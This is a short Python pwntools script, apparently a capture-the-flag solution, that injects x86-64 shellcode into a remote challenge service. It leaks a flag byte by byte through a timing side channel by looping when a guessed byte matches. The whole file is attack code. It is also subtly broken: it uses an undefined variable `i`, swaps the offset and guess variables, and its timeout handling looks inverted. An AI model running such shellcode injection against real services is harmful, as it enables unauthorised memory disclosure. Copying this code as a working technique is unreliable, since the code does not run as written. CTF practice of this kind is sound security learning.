from pwn import *

flag = ''
for idx in range(0x30):
    for ascii in range(256):
        r = remote("edu-ctf.zoolab.org", "10002")
        shell_code = '''
            mov rbx, [rsp];
            lea rbx, [rbx+0x2c64];
            lea rdx, [rbx + ''' + str(ascii)+ '''];
            mov al, [rdx];
            cmp al, ''' + str(i) + ''';
            je loop;
            mov rax, 0;
            syscall;
        loop:
            nop
            jmp loop;
        '''
        r.recvline()
        r.sendline(asm(shell_code))
        try:
            r.recvline(timeout=5)
            print('timout', i)
            flag += chr(i)
            break
        except:
            pass
    print(flag)